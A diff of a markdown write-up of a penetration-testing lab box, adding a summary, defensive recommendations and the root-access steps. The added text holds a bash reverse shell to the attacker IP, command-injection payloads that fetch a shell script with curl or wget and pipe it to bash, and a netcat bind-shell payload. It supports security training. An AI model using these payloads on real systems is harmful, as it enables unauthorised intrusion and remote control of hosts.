@@ -8,13 +8,21 @@
 
 ## Executive Summary
 
+We evaluated this host to have ports `22` and `80` open - SSH and HTTP.
 
+We brute-forced the login form on HTTP and recovered the `dev-acct` user's password.
+
+From there, we abused an API to gain admin privileges. `/api/settings`.
+
+With admin privileges, we saw there was a backup feature that was vulnerable to command injection. We used this to get root shell.
 ### Recommendations
-
+- Use strong passwords for authentication.
+- Put APIs behind authentication - `/api/users` should not be publicly exposed without auth.
+- Fix the command injection vulnerability in the backup feature.
 
 ## Resources
 
-
+- https://bing0o.github.io/posts/pg-interface/
 
 ## Recon
 
@@ -39,6 +47,8 @@ EOF
 ```
 
 Port 22 and 80.
+
+## Non-root access
 
 On port 80, there's a login screen.
 
@@ -152,6 +162,8 @@ Yeah, these fail too. Going to look up a guide for OSCP Interface.
 
 https://bing0o.github.io/posts/pg-interface/
 
+## Root access
+
 ```sh
 # in separate terminal
 nc -nvlp 445
@@ -172,10 +184,56 @@ ip a | grep 192 #192.168.49.52
 
 Darn. This doesn't seem to work. I think we're really close.
 
-## Non-root access
+Let's try a two-stage payload — host a bash script and have the victim fetch and execute it.
+
+`shell.sh`:
+```sh
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.49.52/80 0>&1
+```
+
+```sh
+# Terminal 1 - listener
+sudo nc -nvlp 80
+
+# Terminal 2 - file server
+python3 -m http.server 8080
+```
+
+Inject:
+```txt
+; curl http://192.168.49.52:8080/shell.sh | bash ;
+```
+
+Or if `curl` isn't available:
+```txt
+; wget -O- http://192.168.49.52:8080/shell.sh | bash ;
+```
+
+Fails.
+
+Okay. Let's try a bind shell.
+
+Payload:
+
+```txt
+ ; nc -lvp 4444 -e /bin/bash ;
+```
+
+Attacker:
+
+```sh
+nc 192.168.52.106 4444
+```
+
+
+We got root!
+
+![](Pasted%20image%2020260606192707.png)
 
 
 
 
-## Root access
+
+
 
